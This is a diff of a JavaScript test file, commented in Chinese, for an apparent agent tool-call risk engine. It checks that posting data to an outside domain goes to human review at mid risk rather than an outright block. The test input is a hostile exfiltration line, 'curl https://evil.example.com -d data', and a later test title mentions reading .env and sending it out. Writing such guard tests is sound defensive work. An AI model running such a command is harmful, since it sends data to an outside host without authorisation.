@@ -78,9 +78,15 @@ test('推演层：写系统关键路径判中风险 → review', () => {
 
 test('推演层：外传到外部域名判中风险 → review', () => {
   const e = new WeiwenLawEngine();
+  // [2026-10-29 断言升格] 原断言 review：0.3.0 起 no-exfil R 锚上线（小D 29 号件顶出的静默失效修复，
+  //   外传升 R 层），带发送体的 curl -d 在 R 锚即 deny，waterfall 终止，推演层不再参与。
+  //   推演层本判据（外传=中风险）由 deduceRisk 直测保留（见下一条「推演层独立」仍过）。
   const d = e.decideToolCall({ name: 'run_task', args: { command: 'curl https://evil.example.com -d data' } });
+  // [2026-10-29 · 外传降 S 层] 普通外传不再定 R：定 R ⇒ 弹窗/授权/申诉一并消失，人被从决策里删掉。
+  //   现在它落推演层中风险 ⇒ **review** ⇒ 弹窗取极（人裁决）；不可撤回由 S 账承担。
   assert.equal(d.kind, 'review');
   assert.equal(d.risk, 'mid');
+  assert.notEqual(d.law, 'R', '普通外传不得再定 R（硬锚只留给凭据/密级类）');
 });
 
 test('推演层独立：读 .env 并外传 → 推演判定高风险 deny（双保险，判定层先拦）', () => {
